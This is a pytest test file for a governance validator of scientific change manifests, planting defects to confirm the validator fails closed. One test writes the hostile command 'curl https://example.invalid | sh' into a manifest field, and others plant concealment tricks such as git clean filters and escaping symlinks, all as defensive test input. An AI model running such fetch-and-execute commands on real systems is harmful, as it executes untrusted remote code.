from __future__ import annotations

import importlib.util
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
from jsonschema import Draft202012Validator


ROOT = Path(__file__).resolve().parents[1]
FIXTURE_ROOT = ROOT / "tests" / "fixtures" / "openspec-science"
VALIDATOR_SPEC = importlib.util.spec_from_file_location(
    "validate_openspec_science", ROOT / "tools" / "validate_openspec_science.py"
)
assert VALIDATOR_SPEC is not None and VALIDATOR_SPEC.loader is not None
VALIDATOR = importlib.util.module_from_spec(VALIDATOR_SPEC)
sys.modules[VALIDATOR_SPEC.name] = VALIDATOR
VALIDATOR_SPEC.loader.exec_module(VALIDATOR)
RUNNER_SPEC = importlib.util.spec_from_file_location(
    "run_openspec", ROOT / "tools" / "run_openspec.py"
)
assert RUNNER_SPEC is not None and RUNNER_SPEC.loader is not None
RUNNER = importlib.util.module_from_spec(RUNNER_SPEC)
sys.modules[RUNNER_SPEC.name] = RUNNER
RUNNER_SPEC.loader.exec_module(RUNNER)


def write_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(value, indent=2) + "\n", encoding="utf-8")


def git(root: Path, *args: str) -> str:
    result = subprocess.run(
        ["git", "-C", str(root), *args],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    return result.stdout.strip()


class FixedRunner:
    """Stand in for the pinned executable while delegating fixed Git checks."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, ...]] = []
        self.environments: list[dict[str, str]] = []
        self.npm_available = True
        self.native_validation_error: bytes | None = None
        self.expected_policy_digests: dict[str, dict[str, str]] = {}
        self.expected_ledger_prefixes: dict[str, dict[str, int | str]] = {}
        self.expected_delivery_tree_sha256 = ""

    def __call__(
        self, argv: tuple[str, ...], *, cwd: Path, env: dict[str, str]
    ) -> subprocess.CompletedProcess[bytes]:
        self.calls.append(tuple(argv))
        self.environments.append(dict(env))
        assert env["OPENSPEC_TELEMETRY"] == "0"
        assert env["OPENSPEC_NO_UPDATE_CHECK"] == "1"
        if Path(argv[0]).name == "npm":
            assert argv[1:] == (
                "ci",
                "--ignore-scripts",
                "--offline",
                "--no-audit",
                "--no-fund",
            )
            if not self.npm_available:
                return subprocess.CompletedProcess(argv, 1, b"", b"offline cache unavailable")
            executable = cwd / "node_modules" / ".bin" / "openspec"
            executable.parent.mkdir(parents=True)
            executable.write_text("fixture executable; never directly executed\n", encoding="utf-8")
            executable.chmod(0o755)
            return subprocess.CompletedProcess(argv, 0, b"installed\n", b"")
        if Path(argv[0]).name == "openspec":
            if argv[1:] == ("--version",):
                return subprocess.CompletedProcess(argv, 0, b"1.11.0\n", b"")
            if (
                len(argv) == 7
                and argv[1] == "validate"
                and argv[3:]
                == ("--type", "change", "--strict", "--no-interactive")
            ):
                if self.native_validation_error is not None:
                    return subprocess.CompletedProcess(
                        argv, 2, b"", self.native_validation_error
                    )
                return subprocess.CompletedProcess(argv, 0, b"valid\n", b"")
            raise AssertionError(f"unexpected OpenSpec argv: {argv}")
        assert Path(argv[0]).name == "git"
        assert argv[1] == "-C"
        git_root = Path(argv[2]).resolve()
        assert git_root == cwd or cwd in git_root.parents
        return subprocess.run(
            list(argv),
            cwd=cwd,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )


def valid_repository(destination: Path) -> tuple[Path, FixedRunner]:
    destination.mkdir()
    git(destination, "init", "-q")
    git(destination, "config", "user.name", "OpenSpec fixture")
    git(destination, "config", "user.email", "fixture@example.invalid")
    git(destination, "config", "core.fileMode", "true")
    (destination / ".gitignore").write_text("node_modules/\n", encoding="utf-8")
    authority = destination / "authority" / "current.md"
    authority.parent.mkdir(parents=True)
    authority.write_text("# Frozen authority\n\nLocal design only.\n", encoding="utf-8")
    git(destination, "add", ".gitignore", "authority/current.md")
    git(destination, "commit", "-q", "-m", "fixture authority base")
    base_commit = git(destination, "rev-parse", "HEAD")

    schema_destination = destination / VALIDATOR.SCHEMA_PATH
    schema_destination.parent.mkdir(parents=True)
    shutil.copy2(ROOT / VALIDATOR.SCHEMA_PATH, schema_destination)
    config_destination = destination / VALIDATOR.CONFIG_PATH
    config_destination.parent.mkdir(parents=True)
    shutil.copy2(ROOT / VALIDATOR.CONFIG_PATH, config_destination)
    shutil.copytree(
        ROOT / "openspec" / "schemas" / "scientific-change",
        destination / "openspec" / "schemas" / "scientific-change",
    )

    shutil.copy2(ROOT / "package.json", destination / "package.json")
    shutil.copy2(ROOT / "package-lock.json", destination / "package-lock.json")

    change_id = "change-one"
    change_root = destination / "openspec" / "changes" / change_id
    (change_root / "specs" / "science-control").mkdir(parents=True)
    (change_root / ".openspec.yaml").write_text(
        "schema: scientific-change\ncreated: 2026-08-27\n", encoding="utf-8"
    )
    artifact_payloads = {
        "proposal.md": "## Why\n\nExercise the governance fixture.\n",
        "authority.md": "## Base Commit\n\nBound by governance.json.\n",
        "design.md": "## Context\n\nTyped checks only.\n",
        "tasks.md": "## 1. Implementation\n\n- [ ] 1.1 Fixture task\n",
        "verification.md": "## Typed Checks\n\nAll eight registered checks.\n",
        "specs/science-control/spec.md": (
            "## Purpose\n\nTest fixture science control.\n\n"
            "## ADDED Requirements\n\n### Requirement: Fail closed\n\n"
            "The validator SHALL reject a planted defect.\n\n"
            "#### Scenario: Invalid permission\n\n"
            "- **WHEN** runtime is enabled\n- **THEN** validation fails\n"
        ),
    }
    for relative, payload in artifact_payloads.items():
        path = change_root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(payload, encoding="utf-8")

    findings = destination / "findings" / f"{change_id}.csv"
    findings.parent.mkdir()
    findings.write_text(",".join(VALIDATOR.FINDINGS_HEADER) + "\n", encoding="utf-8")

    governance = {
        "$schema": VALIDATOR.SCHEMA_ID,
        "schemaVersion": 1,
        "id": change_id,
        "baseCommit": base_commit,
        "claimCeiling": "local-design-only",
        "workflow": {"state": "local-implementation", "blockers": []},
        "openSpec": {
            "configPath": VALIDATOR.CONFIG_PATH,
            "schemaName": "scientific-change",
            "schemaPath": VALIDATOR.OPEN_SPEC_SCHEMA_PATH,
            "packageJsonPath": "package.json",
            "lockFilePath": "package-lock.json",
            "packageName": VALIDATOR.OPEN_SPEC_PACKAGE,
            "version": VALIDATOR.OPEN_SPEC_VERSION,
        },
        "artifacts": {
            "proposal": f"openspec/changes/{change_id}/proposal.md",
            "authority": f"openspec/changes/{change_id}/authority.md",
            "specs": [
                f"openspec/changes/{change_id}/specs/science-control/spec.md"
            ],
            "design": f"openspec/changes/{change_id}/design.md",
            "tasks": f"openspec/changes/{change_id}/tasks.md",
            "verification": f"openspec/changes/{change_id}/verification.md",
            "governance": f"openspec/changes/{change_id}/governance.json",
            "findings": f"findings/{change_id}.csv",
        },
        "authorityBindings": [
            {
                "path": "authority/current.md",
                "sha256": VALIDATOR.sha256_file(authority),
                "role": "frozen fixture authority",
                "qualification": "current",
            }
        ],
        "permissions": {
            "runtimeAllowed": False,
            "externalMutationAllowed": False,
            "heldOutOutcomeAccessAllowed": False,
            "aiSelectorAllowed": False,
            "evidencePromotionAllowed": False,
        },
        "checkIds": list(VALIDATOR.CHECK_IDS),
        "humanCheckpoints": [
            {
                "id": "GATE-PLAN",
                "scope": "plan-approval",
                "status": "pending",
                "decisionBinding": None,
            },
            {
                "id": "GATE-RUN",
                "scope": "run-authorization",
                "status": "not-requested",
                "decisionBinding": None,
            },
            {
                "id": "GATE-PROMOTION",
                "scope": "evidence-promotion",
                "status": "not-requested",
                "decisionBinding": None,
            },
        ],
        "pathOwnership": {
            "allowed": [
                ".gitignore",
                VALIDATOR.SCHEMA_PATH,
                "package.json",
                "package-lock.json",
                VALIDATOR.CONFIG_PATH,
                "openspec/schemas/scientific-change/",
                f"openspec/changes/{change_id}/",
                f"findings/{change_id}.csv",
            ],
            "forbidden": [".local/", "upstream/"],
        },
        "verification": {
            "status": "not-run",
            "independentReviewerRequired": True,
            "reportBinding": None,
        },
    }
    write_json(change_root / "governance.json", governance)
    runner = FixedRunner()
    runner.expected_policy_digests = {
        change_id: {
            key: VALIDATOR.canonical_json_digest(governance[key])
            for key in ("authorityBindings", "pathOwnership", "workflow")
        }
    }
    ledger_bytes = findings.read_bytes()
    runner.expected_ledger_prefixes = {
        change_id: {
            "length": len(ledger_bytes),
            "sha256": VALIDATOR.sha256_bytes(ledger_bytes),
        }
    }
    refresh_delivery_checkpoint(destination, runner)
    return destination, runner


def fixture_changed_state(
    root: Path,
) -> tuple[set[str], dict[str, tuple[str, str]]]:
    governance = json.loads(
        (root / "openspec" / "changes" / "change-one" / "governance.json").read_text(
            encoding="utf-8"
        )
    )
    base = governance["baseCommit"]
    paths: set[str] = set()
    commands = (
        ("diff-tree", "--no-commit-id", "--name-only", "-r", "-z", base, "HEAD", "--"),
        ("diff-index", "--cached", "--name-only", "-z", "HEAD", "--"),
        ("ls-files", "--others", "--exclude-standard", "-z", "--"),
    )
    for command in commands:
        result = subprocess.run(
            ["git", "-C", str(root), *command],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        paths.update(
            item.decode("utf-8") for item in result.stdout.split(b"\0") if item
        )
    staged = subprocess.run(
        ["git", "-C", str(root), "ls-files", "--stage", "-z"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    entries, errors = VALIDATOR._parse_stage_entries(staged.stdout)
    assert not errors
    indexed = {
        relative: (mode, object_id) for mode, object_id, relative in entries
    }
    for mode, object_id, relative in entries:
        if mode not in {"100644", "100755", "120000"}:
            continue
        path = root / relative
        try:
            payload = (
                os.readlink(path).encode("utf-8", errors="surrogateescape")
                if mode == "120000"
                else path.read_bytes()
            )
        except OSError:
            paths.add(relative)
            continue
        if VALIDATOR._git_blob_id(payload, len(object_id)) != object_id:
            paths.add(relative)
    return paths, indexed


def refresh_delivery_checkpoint(root: Path, runner: FixedRunner) -> None:
    paths, indexed = fixture_changed_state(root)
    runner.expected_delivery_tree_sha256 = VALIDATOR.delivery_tree_digest(
        root, paths, indexed
    )


@pytest.fixture
def governed_repo(tmp_path: Path) -> tuple[Path, FixedRunner]:
    return valid_repository(tmp_path / "repo")


def result_by_id(report: dict, check_id: str) -> dict:
    return next(item for item in report["checks"] if item["id"] == check_id)


def validate_fixture(root: Path, runner: FixedRunner) -> dict:
    governance = json.loads(
        (root / "openspec" / "changes" / "change-one" / "governance.json").read_text(
            encoding="utf-8"
        )
    )
    return VALIDATOR.validate_repository(
        root,
        runner=runner,
        expected_base_commit=governance["baseCommit"],
        expected_policy_digests=runner.expected_policy_digests,
        expected_ledger_prefixes=runner.expected_ledger_prefixes,
        expected_delivery_tree_sha256=runner.expected_delivery_tree_sha256,
    )


def load_fixture(path: Path) -> dict:
    return json.loads(path.read_text(encoding="utf-8"))


PLANTED_DEFECTS = [
    pytest.param(path, id=path.stem)
    for path in sorted(FIXTURE_ROOT.glob("*.json"))
    if path.stem != "tool-unavailable"
]


def apply_mutation(root: Path, fixture: dict) -> None:
    mutation = fixture["mutation"]
    path = root / mutation["path"]
    kind = mutation["kind"]
    if kind == "replace-text":
        before = path.read_text(encoding="utf-8")
        assert before.count(mutation["old"]) == 1
        path.write_text(before.replace(mutation["old"], mutation["new"]), encoding="utf-8")
    elif kind == "append-text":
        path.write_text(path.read_text(encoding="utf-8") + mutation["text"], encoding="utf-8")
    elif kind == "write-text":
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(mutation["text"], encoding="utf-8")
    elif kind == "remove-file":
        path.unlink()
    elif kind == "json-set":
        value = json.loads(path.read_text(encoding="utf-8"))
        cursor = value
        for key in mutation["keys"][:-1]:
            cursor = cursor[key]
        cursor[mutation["keys"][-1]] = mutation["value"]
        write_json(path, value)
    else:
        raise AssertionError(f"unknown fixture mutation: {kind}")


def test_science_change_control_schema_is_valid_draft_2020_12() -> None:
    schema = json.loads((ROOT / VALIDATOR.SCHEMA_PATH).read_text(encoding="utf-8"))
    Draft202012Validator.check_schema(schema)
    assert schema["$id"] == VALIDATOR.SCHEMA_ID


def test_v1_validator_registries_remain_the_exact_frozen_epoch() -> None:
    expected = {
        "adopt-scientific-openspec",
        "phase2-method-freeze",
        "teastore-candidate-pilot-freeze",
    }
    assert set(VALIDATOR.PINNED_POLICY_DIGESTS) == expected
    assert set(VALIDATOR.PINNED_LEDGER_PREFIXES) == expected


def test_unregistered_fourth_change_fails_closed(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    registered = root / "openspec" / "changes" / "change-one"
    unregistered_id = "unregistered-fourth"
    unregistered = root / "openspec" / "changes" / unregistered_id
    shutil.copytree(registered, unregistered)

    governance_path = unregistered / "governance.json"
    governance = json.loads(governance_path.read_text(encoding="utf-8"))
    governance["id"] = unregistered_id
    governance["artifacts"] = {
        key: (
            [item.replace("change-one", unregistered_id) for item in value]
            if isinstance(value, list)
            else value.replace("change-one", unregistered_id)
        )
        for key, value in governance["artifacts"].items()
    }
    write_json(governance_path, governance)
    shutil.copy2(
        root / "findings" / "change-one.csv",
        root / "findings" / f"{unregistered_id}.csv",
    )

    report = validate_fixture(root, runner)
    check = result_by_id(report, "governance-schema")
    assert report["status"] == "fail"
    assert check["status"] == "fail"
    diagnostics = " ".join(check["diagnostics"])
    assert "active change set differs from the pinned policy registry" in diagnostics
    assert unregistered_id in diagnostics


def test_clean_fixture_passes_at_local_design_ceiling(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    report = validate_fixture(root, runner)
    assert report["status"] == "pass", report
    assert report["scienceControlValid"] is True
    assert report["runtimeAuthorized"] is False
    assert report["promotionEligible"] is False
    assert tuple(item["id"] for item in report["checks"]) == VALIDATOR.CHECK_IDS
    assert {item["status"] for item in report["checks"]} == {"pass"}
    openspec_calls = [call for call in runner.calls if Path(call[0]).name == "openspec"]
    assert len(openspec_calls) == 2
    assert openspec_calls[0][1:] == ("--version",)
    assert openspec_calls[1][1:] == (
        "validate",
        "change-one",
        "--type",
        "change",
        "--strict",
        "--no-interactive",
    )
    assert all(str(root) not in call[0] for call in openspec_calls)


@pytest.mark.parametrize("fixture_path", PLANTED_DEFECTS)
def test_each_registered_checker_is_watched_failing_on_its_planted_defect(
    tmp_path: Path, fixture_path: Path
) -> None:
    root, runner = valid_repository(tmp_path / "repo")
    fixture = load_fixture(fixture_path)
    apply_mutation(root, fixture)
    report = validate_fixture(root, runner)
    targeted = result_by_id(report, fixture["checkId"])
    assert targeted["status"] == fixture["expectedStatus"], report
    assert fixture["expectedDiagnostic"] in " ".join(targeted["diagnostics"])
    assert report["status"] == "fail"
    assert report["runtimeAuthorized"] is False
    assert report["promotionEligible"] is False


def test_planted_defect_matrix_covers_every_registered_checker() -> None:
    targeted = {
        load_fixture(path)["checkId"]
        for path in FIXTURE_ROOT.glob("*.json")
        if load_fixture(path)["expectedStatus"] == "fail"
    }
    assert targeted == set(VALIDATOR.CHECK_IDS)


def test_missing_pinned_tool_is_cannot_run_not_pass(tmp_path: Path) -> None:
    root, runner = valid_repository(tmp_path / "repo")
    fixture = load_fixture(FIXTURE_ROOT / "tool-unavailable.json")
    runner.npm_available = False
    report = validate_fixture(root, runner)
    assert report["status"] == "cannot_run", report
    assert result_by_id(report, "openspec-tool-pin")["status"] == "cannot_run"
    assert result_by_id(report, "change-artifacts")["status"] == "cannot_run"
    assert fixture["expectedDiagnostic"] in " ".join(
        result_by_id(report, "openspec-tool-pin")["diagnostics"]
    )
    assert report["scienceControlValid"] is False
    assert report["runtimeAuthorized"] is False
    assert report["promotionEligible"] is False


def test_native_openspec_rejection_is_watched_and_not_masked(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    runner.native_validation_error = b"planted dependency rejection"
    report = validate_fixture(root, runner)
    check = result_by_id(report, "change-artifacts")
    assert check["status"] == "fail"
    assert "planted dependency rejection" in " ".join(check["diagnostics"])


def test_real_pinned_openspec_rejects_an_invalid_delta(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, fixture_runner = governed_repo
    spec = root / "openspec" / "changes" / "change-one" / "specs" / "science-control" / "spec.md"
    spec.write_text(
        "## ADDED Requirements\n\n### Requirement: Missing scenario\n\n"
        "The validator SHALL reject this delta.\n",
        encoding="utf-8",
    )
    governance = json.loads(
        (root / "openspec" / "changes" / "change-one" / "governance.json").read_text(
            encoding="utf-8"
        )
    )
    report = VALIDATOR.validate_repository(
        root,
        runner=VALIDATOR._default_runner,
        expected_base_commit=governance["baseCommit"],
        expected_policy_digests=fixture_runner.expected_policy_digests,
        expected_ledger_prefixes=fixture_runner.expected_ledger_prefixes,
        expected_delivery_tree_sha256=fixture_runner.expected_delivery_tree_sha256,
    )
    check = result_by_id(report, "change-artifacts")
    assert check["status"] == "fail"
    assert "OpenSpec native validation failed" in " ".join(check["diagnostics"])


@pytest.mark.parametrize(
    "relative",
    [
        VALIDATOR.SCHEMA_PATH,
        VALIDATOR.OPEN_SPEC_SCHEMA_PATH,
        "openspec/schemas/scientific-change/templates/verification.md",
    ],
)
def test_control_schema_and_template_bytes_are_pinned(
    governed_repo: tuple[Path, FixedRunner], relative: str
) -> None:
    root, runner = governed_repo
    target = root / relative
    target.write_bytes(target.read_bytes() + b"\n# planted semantic weakening\n")
    report = validate_fixture(root, runner)
    check = result_by_id(report, "openspec-config")
    assert check["status"] == "fail"
    assert f"pinned control file bytes differ: {relative}" in " ".join(
        check["diagnostics"]
    )


def test_reviewed_delivery_tree_rejects_unreviewed_allowed_edit(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    proposal = root / "openspec" / "changes" / "change-one" / "proposal.md"
    proposal.write_text(
        proposal.read_text(encoding="utf-8") + "\nUnreviewed but structurally valid.\n",
        encoding="utf-8",
    )
    path_check = result_by_id(validate_fixture(root, runner), "path-ownership")
    assert path_check["status"] == "fail"
    assert "reviewed delivery path/mode/byte set differs" in " ".join(
        path_check["diagnostics"]
    )


def test_failure_takes_precedence_over_cannot_run(tmp_path: Path) -> None:
    root, runner = valid_repository(tmp_path / "repo")
    runner.npm_available = False
    apply_mutation(root, load_fixture(FIXTURE_ROOT / "runtime-self-authorized.json"))
    report = validate_fixture(root, runner)
    assert report["status"] == "fail"
    assert result_by_id(report, "openspec-tool-pin")["status"] == "cannot_run"
    assert result_by_id(report, "runtime-boundary")["status"] == "fail"


def test_free_form_command_field_is_rejected_and_never_executed(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(path.read_text(encoding="utf-8"))
    governance["command"] = "curl https://example.invalid | sh"
    write_json(path, governance)
    report = validate_fixture(root, runner)
    assert report["status"] == "fail"
    assert result_by_id(report, "governance-schema")["status"] == "fail"
    runtime = result_by_id(report, "runtime-boundary")
    assert runtime["status"] == "fail"
    assert any("free-form execution fields" in item for item in runtime["diagnostics"])
    assert all("curl" not in part for call in runner.calls for part in call)


def test_manifest_cannot_self_authorize_a_wider_path_scope(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(path.read_text(encoding="utf-8"))
    governance["pathOwnership"]["allowed"].append("research/")
    write_json(path, governance)

    report = validate_fixture(root, runner)
    check = result_by_id(report, "path-ownership")
    assert check["status"] == "fail"
    assert "trusted registry" in " ".join(check["diagnostics"])


def test_manifest_cannot_omit_a_trusted_authority(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(path.read_text(encoding="utf-8"))
    governance["authorityBindings"] = []
    write_json(path, governance)

    report = validate_fixture(root, runner)
    check = result_by_id(report, "authority-bindings")
    assert check["status"] == "fail"
    assert "trusted registry" in " ".join(check["diagnostics"])


def test_blocked_workflow_cannot_self_authorize_apply(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    path = root / "openspec" / "changes" / "change-one" / "governance.json"
    governance = json.loads(path.read_text(encoding="utf-8"))
    governance["workflow"] = {
        "state": "blocked",
        "blockers": ["planted-prerequisite"],
    }
    write_json(path, governance)
    runner.expected_policy_digests["change-one"]["workflow"] = (
        VALIDATOR.canonical_json_digest(governance["workflow"])
    )
    refresh_delivery_checkpoint(root, runner)
    blocked = validate_fixture(root, runner)
    assert blocked["status"] == "pass", blocked
    denied = VALIDATOR.operation_preflight(blocked, root, "apply", "change-one")
    assert denied["allowed"] is False

    governance["workflow"] = {"state": "local-implementation", "blockers": []}
    write_json(path, governance)
    report = validate_fixture(root, runner)
    check = result_by_id(report, "runtime-boundary")
    assert check["status"] == "fail"
    assert "workflow state differs from the trusted registry" in " ".join(
        check["diagnostics"]
    )


def test_duplicate_json_member_is_rejected_fail_closed(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    path = root / "openspec" / "changes" / "change-one" / "governance.json"
    text = path.read_text(encoding="utf-8")
    assert text.count('"schemaVersion": 1') == 1
    path.write_text(
        text.replace('"schemaVersion": 1', '"schemaVersion": 1,\n  "schemaVersion": 1'),
        encoding="utf-8",
    )
    report = validate_fixture(root, runner)
    assert report["status"] == "fail"
    governance = result_by_id(report, "governance-schema")
    assert any("duplicate JSON member" in item for item in governance["diagnostics"])


def test_findings_rows_bind_review_context_and_existing_artifact(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    ledger = root / "findings" / "change-one.csv"
    ledger.write_text(
        ",".join(VALIDATOR.FINDINGS_HEADER)
        + "\n"
        + (
            "F-001,change-one,fresh-subagent,DECISION,major,resolved,"
            "openspec/changes/change-one/design.md,Found boundary gap,"
            "Planted fixture demonstrated rejection,Design corrected\n"
        ),
        encoding="utf-8",
    )
    report = validate_fixture(root, runner)
    assert report["status"] == "pass", report


def test_findings_history_is_append_only_relative_to_pinned_base(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    ledger = root / "findings" / "change-one.csv"
    retained = (
        "F-001,change-one,fresh-subagent,DECISION,major,resolved,"
        "authority/current.md,Original observation,Original evidence,Original disposition\n"
    )
    ledger.write_text(
        ",".join(VALIDATOR.FINDINGS_HEADER) + "\n" + retained,
        encoding="utf-8",
    )
    git(root, "add", "findings/change-one.csv")
    git(root, "commit", "-q", "-m", "retain findings history")
    reviewed_base = git(root, "rev-parse", "HEAD")

    manifest_path = (
        root / "openspec" / "changes" / "change-one" / "governance.json"
    )
    governance = json.loads(manifest_path.read_text(encoding="utf-8"))
    governance["baseCommit"] = reviewed_base
    write_json(manifest_path, governance)
    retained_bytes = ledger.read_bytes()
    runner.expected_ledger_prefixes["change-one"] = {
        "length": len(retained_bytes),
        "sha256": VALIDATOR.sha256_bytes(retained_bytes),
    }

    ledger.write_text(
        ",".join(VALIDATOR.FINDINGS_HEADER)
        + "\n"
        + retained
        + (
            "F-002,change-one,human,RECORD,note,resolved,authority/current.md,"
            "Later observation,Later evidence,Later disposition\n"
        ),
        encoding="utf-8",
    )
    appended = validate_fixture(root, runner)
    assert result_by_id(appended, "findings-ledger")["status"] == "pass", appended

    ledger.write_text(
        ledger.read_text(encoding="utf-8").replace(
            "Original observation", "Rewritten observation"
        ),
        encoding="utf-8",
    )
    rewritten = validate_fixture(root, runner)
    finding_check = result_by_id(rewritten, "findings-ledger")
    assert finding_check["status"] == "fail"
    assert "rewrites bytes retained at the pinned base" in " ".join(
        finding_check["diagnostics"]
    )


def test_findings_checkpoint_rejects_rewrite_when_ledger_was_absent_at_base(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    ledger = root / "findings" / "change-one.csv"
    ledger.write_text(
        ",".join(VALIDATOR.FINDINGS_HEADER)
        + "\n"
        + (
            "F-001,change-one,fresh-subagent,DECISION,major,resolved,"
            "authority/current.md,Original observation,Original evidence,"
            "Original disposition\n"
        ),
        encoding="utf-8",
    )
    checkpoint = ledger.read_bytes()
    runner.expected_ledger_prefixes["change-one"] = {
        "length": len(checkpoint),
        "sha256": VALIDATOR.sha256_bytes(checkpoint),
    }
    assert result_by_id(validate_fixture(root, runner), "findings-ledger")["status"] == "pass"

    ledger.write_text(
        ledger.read_text(encoding="utf-8").replace(
            "Original observation", "Rewritten observation"
        ),
        encoding="utf-8",
    )
    finding_check = result_by_id(validate_fixture(root, runner), "findings-ledger")
    assert finding_check["status"] == "fail"
    assert "code-owned checkpoint" in " ".join(finding_check["diagnostics"])


@pytest.mark.parametrize(
    ("enable", "disable"),
    [
        ("--assume-unchanged", "--no-assume-unchanged"),
        ("--skip-worktree", "--no-skip-worktree"),
    ],
)
def test_index_concealment_flags_cannot_hide_a_tracked_edit(
    governed_repo: tuple[Path, FixedRunner], enable: str, disable: str
) -> None:
    root, runner = governed_repo
    relative = ".gitignore"
    git(root, "update-index", enable, relative)
    target = root / relative
    original = target.read_bytes()
    try:
        target.write_bytes(original + b"concealed/\n")
        report = validate_fixture(root, runner)
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any(
            "assume-unchanged or skip-worktree" in item
            for item in path_check["diagnostics"]
        )
    finally:
        target.write_bytes(original)
        git(root, "update-index", disable, relative)


def test_repository_ignore_cannot_hide_an_owned_untracked_path(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    ignored = "openspec/changes/change-one/concealed.txt"
    gitignore = root / ".gitignore"
    gitignore.write_text(
        gitignore.read_text(encoding="utf-8") + ignored + "\n",
        encoding="utf-8",
    )
    (root / ignored).write_text("concealed bytes\n", encoding="utf-8")

    report = validate_fixture(root, runner)
    path_check = result_by_id(report, "path-ownership")
    assert path_check["status"] == "fail"
    assert any(
        "ignored untracked path overlaps owned scope" in item
        for item in path_check["diagnostics"]
    )


def test_repository_ignore_cannot_hide_a_forbidden_local_path(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    gitignore = root / ".gitignore"
    gitignore.write_text(
        gitignore.read_text(encoding="utf-8") + ".local/\n",
        encoding="utf-8",
    )
    hidden = root / ".local" / "hidden.txt"
    hidden.parent.mkdir()
    hidden.write_text("concealed local payload\n", encoding="utf-8")

    report = validate_fixture(root, runner)
    path_check = result_by_id(report, "path-ownership")
    assert path_check["status"] == "fail"
    assert "ignored untracked path overlaps forbidden scope" in " ".join(
        path_check["diagnostics"]
    )


def test_forbidden_python_cache_name_has_no_ignore_exemption(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    gitignore = root / ".gitignore"
    gitignore.write_text(
        gitignore.read_text(encoding="utf-8") + ".local/\n",
        encoding="utf-8",
    )
    hidden = root / ".local" / "__pycache__" / "hidden.pyc"
    hidden.parent.mkdir(parents=True)
    hidden.write_bytes(b"concealed bytecode\n")

    path_check = result_by_id(validate_fixture(root, runner), "path-ownership")
    assert path_check["status"] == "fail"
    assert "ignored untracked path overlaps forbidden scope" in " ".join(
        path_check["diagnostics"]
    )


def test_ignored_unowned_result_payload_is_rejected(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    gitignore = root / ".gitignore"
    gitignore.write_text(
        gitignore.read_text(encoding="utf-8") + "results/generated/\n",
        encoding="utf-8",
    )
    hidden = root / "results" / "generated" / "concealed.json"
    hidden.parent.mkdir(parents=True)
    hidden.write_text('{"concealed": true}\n', encoding="utf-8")

    path_check = result_by_id(validate_fixture(root, runner), "path-ownership")
    assert path_check["status"] == "fail"
    assert "ignored untracked path is outside reviewed cache exceptions" in " ".join(
        path_check["diagnostics"]
    )


def test_core_filemode_and_index_mode_comparison_cannot_hide_chmod(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    target = root / ".gitignore"
    original_mode = target.stat().st_mode
    git(root, "config", "core.fileMode", "false")
    try:
        target.chmod(original_mode | 0o111)
        report = validate_fixture(root, runner)
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any("core.fileMode must remain true" in item for item in path_check["diagnostics"])
        assert any("executable mode differs" in item for item in path_check["diagnostics"])
    finally:
        target.chmod(original_mode)
        git(root, "config", "core.fileMode", "true")


def test_tracked_file_cannot_be_replaced_by_escaping_symlink(
    governed_repo: tuple[Path, FixedRunner], tmp_path: Path
) -> None:
    root, runner = governed_repo
    target = root / "authority" / "current.md"
    original = target.read_bytes()
    outside = tmp_path / "outside-authority.md"
    outside.write_bytes(original)
    target.unlink()
    target.symlink_to(outside)
    try:
        report = validate_fixture(root, runner)
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any(
            "tracked file changed object type" in item
            or "object-type escape" in item
            for item in path_check["diagnostics"]
        )
    finally:
        target.unlink()
        target.write_bytes(original)


def test_local_clean_filter_and_info_attributes_are_rejected(
    governed_repo: tuple[Path, FixedRunner],
) -> None:
    root, runner = governed_repo
    attributes_raw = git(root, "rev-parse", "--git-path", "info/attributes")
    attributes = Path(attributes_raw)
    if not attributes.is_absolute():
        attributes = root / attributes
    attributes.parent.mkdir(parents=True, exist_ok=True)
    previous = attributes.read_bytes() if attributes.exists() else None
    attributes.write_text("authority/current.md filter=hide\n", encoding="utf-8")
    git(root, "config", "filter.hide.clean", "sed /semantic/d")
    try:
        report = validate_fixture(root, runner)
        path_check = result_by_id(report, "path-ownership")
        assert path_check["status"] == "fail"
        assert any("worktree-local Git attributes" in item for item in path_check["diagnostics"])
        assert any("filter configuration" in item for item in path_check["diagnostics"])
    finally:
        git(root, "config", "--unset-all", "filter.hide.clean")
        if previous is None:
            attributes.unlink()
        else:
            attributes.write_bytes(previous)


